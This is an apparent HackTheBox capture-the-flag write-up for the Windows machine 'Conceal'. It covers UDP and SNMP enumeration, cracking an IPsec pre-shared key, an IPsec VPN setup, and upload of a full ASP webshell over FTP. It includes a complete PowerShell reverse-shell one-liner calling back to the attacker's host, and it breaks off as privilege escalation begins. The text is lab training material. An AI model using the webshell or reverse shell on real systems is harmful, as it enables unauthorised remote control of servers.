-&lt;h4 id=&quot;hey-guys-today-conceal-retired-and-heres-my-write-up-about-it-conceal-was-a-straightforward-fun-box-the-only-tricky-part-about-it-is-gaining-ipsec-connection-to-gain-access-to-some-filtered-services-that-first-part-involved-some-guessing-but-after-that-everything-is-simple-and-very-straightforward-i-liked-this-machine-and-it-was-a-very-fun-one-its-a-windows-machine-and-its-ip-is-101010116-i-added-it-to-etchosts-as-concealhtb-lets-jump-right-in&quot;&gt;Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining &lt;a href=&quot;https://en.wikipedia.org/wiki/IPsec&quot;&gt;IPSEC&lt;/a&gt; connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.116&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;conceal.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-got-nothing-&quot;&gt;And we got nothing !&lt;/h4&gt;
-&lt;h4 id=&quot;i-ran-another-nmap-udp-scan-on-all-ports-&quot;&gt;I ran another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; UDP scan on all ports :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-output-was-too-long-so-i-will-show-the-only-important-part-&quot;&gt;The output was too long so I will show the only important part :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/2.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-was-not-sure-about-port-161-but-it-showed-that-port-500-is-open&quot;&gt;It was not sure about port 161, but it showed that port 500 is open.&lt;/h4&gt;
-&lt;h4 id=&quot;i-ran-a-third-scan-on-ports-500-and-161-&quot;&gt;I ran a third scan on ports 500 and 161 :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 161,500 -sV -sU -sC conceal.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
-Nmap scan report for conceal.htb (10.10.10.116)
-Host is up (0.20s latency).
-
-PORT    STATE SERVICE VERSION
-161/udp open  snmp    SNMPv1 server (public)
-| snmp-interfaces: 
-|   Software Loopback Interface 1\x00
-|     IP address: 127.0.0.1  Netmask: 255.0.0.0
-|     Type: softwareLoopback  Speed: 1 Gbps
-|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
-|   Intel(R) 82574L Gigabit Network Connection\x00
-|     IP address: 10.10.10.116  Netmask: 255.255.255.0
-|     MAC address: 00:50:56:b9:55:a7 (VMware)
-|     Type: ethernetCsmacd  Speed: 1 Gbps
-|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
-|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
-|     MAC address: 00:50:56:b9:55:a7 (VMware)
-|     Type: ethernetCsmacd  Speed: 1 Gbps
-|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
-|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
-|     MAC address: 00:50:56:b9:55:a7 (VMware)
-|     Type: ethernetCsmacd  Speed: 1 Gbps
-|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
-|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
-|     MAC address: 00:50:56:b9:55:a7 (VMware)
-|     Type: ethernetCsmacd  Speed: 1 Gbps
-|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received
-| snmp-netstat: 
-|   TCP  0.0.0.0:21           0.0.0.0:0
-|   TCP  0.0.0.0:80           0.0.0.0:0
-|   TCP  0.0.0.0:135          0.0.0.0:0
-|   TCP  0.0.0.0:445          0.0.0.0:0
-|   TCP  0.0.0.0:49664        0.0.0.0:0
-|   TCP  0.0.0.0:49665        0.0.0.0:0
-|   TCP  0.0.0.0:49666        0.0.0.0:0
-|   TCP  0.0.0.0:49667        0.0.0.0:0
-|   TCP  0.0.0.0:49668        0.0.0.0:0
-|   TCP  0.0.0.0:49669        0.0.0.0:0
-|   TCP  0.0.0.0:49670        0.0.0.0:0
-|   TCP  10.10.10.116:139     0.0.0.0:0
-|   UDP  0.0.0.0:123          *:*
-|   UDP  0.0.0.0:161          *:*
-|   UDP  0.0.0.0:500          *:*
-|   UDP  0.0.0.0:4500         *:*
-|   UDP  0.0.0.0:5050         *:*
-|   UDP  0.0.0.0:5353         *:*
-|   UDP  0.0.0.0:5355         *:*
-|   UDP  10.10.10.116:137     *:*
-|   UDP  10.10.10.116:138     *:*
-|   UDP  10.10.10.116:1900    *:*
-|   UDP  10.10.10.116:65496   *:*
-|   UDP  127.0.0.1:1900       *:*
-|_  UDP  127.0.0.1:65497      *:*
-| snmp-processes: 
-|   1: 
-|     Name: System Idle Process
-|   4: 
-|     Name: System
-|   308: 
-|     Name: smss.exe
-|   348: 
-|     Name: svchost.exe
-|     Path: C:\Windows\System32\
-|     Params: -k LocalSystemNetworkRestricted
-|   392: 
-|     Name: csrss.exe
-|   468: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k LocalService
-|   472: 
-|     Name: wininit.exe
-|   484: 
-|     Name: csrss.exe
-|   564: 
-|     Name: winlogon.exe
-|   584: 
-|     Name: services.exe
-|   616: 
-|     Name: lsass.exe
-|     Path: C:\Windows\system32\
-|   696: 
-|     Name: fontdrvhost.exe
-|   704: 
-|     Name: fontdrvhost.exe
-|   712: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k DcomLaunch
-|   812: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k RPCSS
-|   900: 
-|     Name: svchost.exe
-|     Path: C:\Windows\System32\
-|     Params: -k NetworkService
-|   908: 
-|     Name: dwm.exe
-|   940: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k netsvcs
-|   976: 
-|     Name: svchost.exe
-|     Path: C:\Windows\System32\
-|     Params: -k LocalServiceNetworkRestricted
-|   984: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k LocalServiceNoNetwork
-|   1140: 
-|     Name: vmacthlp.exe
-|     Path: C:\Program Files\VMware\VMware Tools\
-|   1232: 
-|     Name: svchost.exe
-|     Path: C:\Windows\System32\
-|     Params: -k LocalServiceNetworkRestricted
-|   1248: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k LocalSystemNetworkRestricted
-|   1292: 
-|     Name: LogonUI.exe
-|     Params:  /flags:0x0 /state0:0xa3a2c855 /state1:0x41c64e6d
-|   1392: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k LocalServiceNetworkRestricted
-|   1400: 
-|     Name: svchost.exe
-|     Path: C:\Windows\System32\
-|     Params: -k LocalServiceNetworkRestricted
-|   1492: 
-|     Name: spoolsv.exe
-|     Path: C:\Windows\System32\
-|   1728: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k apphost
-|   1748: 
-|     Name: svchost.exe
-|     Path: C:\Windows\System32\
-|     Params: -k utcsvc
-|   1788: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k ftpsvc
-|   1856: 
-|     Name: SecurityHealthService.exe
-|   1868: 
-|     Name: snmp.exe
-|     Path: C:\Windows\System32\
-|   1892: 
-|     Name: VGAuthService.exe
-|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
-|   1912: 
-|     Name: vmtoolsd.exe
-|     Path: C:\Program Files\VMware\VMware Tools\
-|   1932: 
-|     Name: ManagementAgentHost.exe
-|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
-|   1956: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k iissvcs
-|   1980: 
-|     Name: MsMpEng.exe
-|   2068: 
-|     Name: Memory Compression
-|   2204: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k LocalServiceAndNoImpersonation
-|   2444: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k NetworkServiceNetworkRestricted
-|   2952: 
-|     Name: WmiPrvSE.exe
-|     Path: C:\Windows\system32\wbem\
-|   2976: 
-|     Name: NisSrv.exe
-|   3052: 
-|     Name: dllhost.exe
-|     Path: C:\Windows\system32\
-|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
-|   3132: 
-|     Name: SearchIndexer.exe
-|     Path: C:\Windows\system32\
-|     Params: /Embedding
-|   3280: 
-|     Name: svchost.exe
-|     Path: C:\Windows\system32\
-|     Params: -k appmodel
-|   3376: 
-|     Name: msdtc.exe
-|     Path: C:\Windows\System32\
-|   3948: 
-|     Name: svchost.exe
-|   5004: 
-|     Name: SearchFilterHost.exe
-|     Path: C:\Windows\system32\
-|     Params:  0 700 704 712 8192 708 
-|   5032: 
-|     Name: SearchProtocolHost.exe
-|     Path: C:\Windows\system32\
-|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 &quot;Software\Microsoft\Windows Search&quot; &quot;Moz
-| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
-|_  System uptime: 2h08m26.61s (770661 timeticks)
-| snmp-win32-services: 
-|   Application Host Helper Service
-|   Background Intelligent Transfer Service
-|   Background Tasks Infrastructure Service
-|   Base Filtering Engine
-|   CNG Key Isolation
-|   COM+ Event System
-|   COM+ System Application
-|   Client License Service (ClipSVC)
-|   Connected Devices Platform Service
-|   Connected User Experiences and Telemetry
-|   CoreMessaging
-|   Cryptographic Services
-|   DCOM Server Process Launcher
-|   DHCP Client
-|   DNS Client
-|   Data Sharing Service
-|   Data Usage
-|   Device Setup Manager
-|   Diagnostic Policy Service
-|   Diagnostic Service Host
-|   Distributed Link Tracking Client
-|   Distributed Transaction Coordinator
-|   Geolocation Service
-|   Group Policy Client
-|   IKE and AuthIP IPsec Keying Modules
-|   IP Helper
-|   IPsec Policy Agent
-|   Local Session Manager
-|   Microsoft Account Sign-in Assistant
-|   Microsoft FTP Service
-|   Network Connection Broker
-|   Network List Service
-|   Network Location Awareness
-|   Network Store Interface Service
-|   Plug and Play
-|   Power
-|   Print Spooler
-|   Program Compatibility Assistant Service
-|   RPC Endpoint Mapper
-|   Remote Procedure Call (RPC)
-|   SNMP Service
-|   SSDP Discovery
-|   Security Accounts Manager
-|   Security Center
-|   Server
-|   Shell Hardware Detection
-|   State Repository Service
-|   Storage Service
-|   Superfetch
-|   System Event Notification Service
-|   System Events Broker
-|   TCP/IP NetBIOS Helper
-|   Task Scheduler
-|   Themes
-|   Tile Data model server
-|   Time Broker
-|   TokenBroker
-|   User Manager
-|   User Profile Service
-|   VMware Alias Manager and Ticket Service
-|   VMware CAF Management Agent Service
-|   VMware Physical Disk Helper Service
-|   VMware Tools
-|   WinHTTP Web Proxy Auto-Discovery Service
-|   Windows Audio
-|   Windows Audio Endpoint Builder
-|   Windows Connection Manager
-|   Windows Defender Antivirus Network Inspection Service
-|   Windows Defender Antivirus Service
-|   Windows Defender Security Centre Service
-|   Windows Driver Foundation - User-mode Driver Framework
-|   Windows Event Log
-|   Windows Firewall
-|   Windows Font Cache Service
-|   Windows Management Instrumentation
-|   Windows Process Activation Service
-|   Windows Push Notifications System Service
-|   Windows Search
-|   Windows Time
-|   Workstation
-|_  World Wide Web Publishing Service
-| snmp-win32-software: 
-|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
-|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
-|_  VMware Tools; 2018-10-12T20:11:02
-| snmp-win32-users: 
-|   Administrator
-|   DefaultAccount
-|   Destitute
-|_  Guest
-500/udp open  isakmp  Microsoft Windows 8
-| ike-version: 
-|   vendor_id: Microsoft Windows 8
-|   attributes: 
-|     MS NT5 ISAKMPOAKLEY
-|     RFC 3947 NAT-T
-|     draft-ietf-ipsec-nat-t-ike-02\n
-|     IKE FRAGMENTATION
-|     MS-Negotiation Discovery Capable
-|_    IKE CGA version 1
-Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;we-have-two-services-to-enumerate-isakmp-which-is-ipsec-and-snmp&quot;&gt;We have two services to enumerate. &lt;code class=&quot;highlighter-rouge&quot;&gt;isakmp&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;snmp&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;snmp-enumeration&quot;&gt;Snmp Enumeration&lt;/h3&gt;
-&lt;h4 id=&quot;i-started-with-snmpwalk-&quot;&gt;I started with &lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -c public -v 1 conceal.htb&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-output-was-very-long-but-we-only-need-this-first-part-&quot;&gt;The output was very long but we only need this first part :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-have-a-password-hash-for-the-ipsec-connection--9c8b1a372b1878851be2c097031b6e43&quot;&gt;We have a password hash for the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection : &lt;code class=&quot;highlighter-rouge&quot;&gt;9C8B1A372B1878851BE2C097031B6E43&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;i-used-crackstation-to-crack-it-and-i-got-this-result-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it and I got this result :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great--now-we-need-to-enumerate-the-ike-vpn-service-to-know-how-to-connect-to-it&quot;&gt;Great ! Now we need to enumerate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ike&lt;/code&gt; vpn service to know how to connect to it.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;ike-scan-setting-up-the-connection&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt;, Setting up The Connection&lt;/h3&gt;
-&lt;h4 id=&quot;i-ran-ike-scan-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and got these results :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-installed-strongswan-to-set-up-the-ipsec-connection-with-the-help-of-the-info-i-got-from-ike-scan-and-some-guessing-i-could-come-up-with-this-configuration-which-worked-&quot;&gt;I installed &lt;code class=&quot;highlighter-rouge&quot;&gt;strongswan&lt;/code&gt; to set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection. With the help of the info I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and some guessing I could come up with this configuration which worked :&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.conf&lt;/code&gt; :
-&lt;img src=&quot;/images/hackthebox/conceal/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn rick-to-conceal
-        authby=secret
-        auto=route
-        keyexchange=ikev1
-        ike=3des-sha1-modp1024
-        left=10.10.xx.xx
-        right=10.10.10.116
-        type=transport
-        esp=3des-sha1
-        rightprotoport=tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.secrets&lt;/code&gt; :
-&lt;img src=&quot;/images/hackthebox/conceal/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.10.xx.xx 10.10.10.116 : PSK &quot;Dudecake1!&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-started-ipsec-then-i-initialized-the-connection-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec&lt;/code&gt; then I initialized the connection :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec start&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec up rick-to-conceal&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-worked-fine-now-we-are-connected-to-a-vpn-network-lets-see-what-new-services-can-we-get&quot;&gt;It worked fine, now we are connected to a vpn network let’s see what new services can we get.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap-second-time&quot;&gt;Nmap (Second Time)&lt;/h3&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-ftp-on-port-21--http-on-port-80-and-smb-on-port-445-i-wanted-to-check-ftp-first-and-see-if-i-can-authenticate-anonymously&quot;&gt;We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.&lt;/h4&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;ftp-file-upload-reverse-shell-and-user-flag&quot;&gt;FTP, File Upload, Reverse Shell and User Flag&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-worked-but-there-was-literally-nothing-on-that-ftp-server-i-uploaded-a-test-file-to-check-if-i-have-write-permissions-on-that-ftp-server-and-i-had&quot;&gt;It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-checked-the-http-service-and-there-was-only-the-default-iis-page-&quot;&gt;I Checked the http service and there was only the default IIS page :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-only-one-directory-called-upload-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got only one directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt
-
-=====================================================
-Gobuster v2.0.0              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://conceal.htb/
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Timeout      : 10s
-=====================================================
-2019/05/17 17:18:57 Starting gobuster
-=====================================================
-/upload (Status: 301)
-=====================================================
-2019/05/17 17:28:23 Finished
-=====================================================
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-went-to-upload-and-found-my-test-file-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; and found my test file :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great--i-uploaded-an-asp-shell-to-get-remote-code-execution-&quot;&gt;Great ! I uploaded an &lt;code class=&quot;highlighter-rouge&quot;&gt;asp&lt;/code&gt; shell to get remote code execution :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;shellasp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.asp&lt;/code&gt; :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--
-ASP Webshell
-Working on latest IIS 
-Referance :- 
-https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
-http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
-http://www.w3schools.com/asp/
---&amp;gt;
-
-
-&amp;lt;%
-Set oScript = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
-Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)
-Set oFileSys = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)
-Function getCommandOutput(theCommand)
-    Dim objShell, objCmdExec
-    Set objShell = CreateObject(&quot;WScript.Shell&quot;)
-    Set objCmdExec = objshell.exec(thecommand)
-    getCommandOutput = objCmdExec.StdOut.ReadAll
-end Function
-%&amp;gt;
-
-
-&amp;lt;HTML&amp;gt;
-&amp;lt;BODY&amp;gt;
-&amp;lt;FORM action=&quot;&quot; method=&quot;GET&quot;&amp;gt;
-&amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=45 value=&quot;&amp;lt;%= szCMD %&amp;gt;&quot;&amp;gt;
-&amp;lt;input type=&quot;submit&quot; value=&quot;Run&quot;&amp;gt;
-&amp;lt;/FORM&amp;gt;
-&amp;lt;PRE&amp;gt;
-&amp;lt;%= &quot;\\&quot; &amp;amp; oScriptNet.ComputerName &amp;amp; &quot;\&quot; &amp;amp; oScriptNet.UserName %&amp;gt;
-&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_name&quot;))%&amp;gt;
-&amp;lt;p&amp;gt;
-&amp;lt;b&amp;gt;The server's port:&amp;lt;/b&amp;gt;
-&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_port&quot;))%&amp;gt;
-&amp;lt;/p&amp;gt;
-&amp;lt;p&amp;gt;
-&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
-&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_software&quot;))%&amp;gt;
-&amp;lt;/p&amp;gt;
-&amp;lt;p&amp;gt;
-&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
-&amp;lt;%Response.Write(Request.ServerVariables(&quot;LOCAL_ADDR&quot;))%&amp;gt;
-&amp;lt;% szCMD = request(&quot;cmd&quot;)
-thisDir = getCommandOutput(&quot;cmd /c&quot; &amp;amp; szCMD)
-Response.Write(thisDir)%&amp;gt;
-&amp;lt;/p&amp;gt;
-&amp;lt;br&amp;gt;
-&amp;lt;/BODY&amp;gt;
-&amp;lt;/HTML&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/17.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-got-a-powershell-reverse-shell-&quot;&gt;I got a powershell reverse shell :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;payload-&quot;&gt;Payload :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&amp;gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-user&quot;&gt;We got user.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag&quot;&gt;SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag&lt;/h3&gt;
-&lt;h4 id=&quot;after-getting-user-the-privilege-escalation-is-easy-and-straightforward-before-doing-any-enumeration-i-checked-my-privileges-as-destitute-and-i-found-that-i-had-the-seimpersonateprivilege&quot;&gt;After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as &lt;code class=&quot;highlighter-rouge&quot;&gt;Destitute&lt;/code&gt; and I found that I had the &lt;code class=&quot;highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
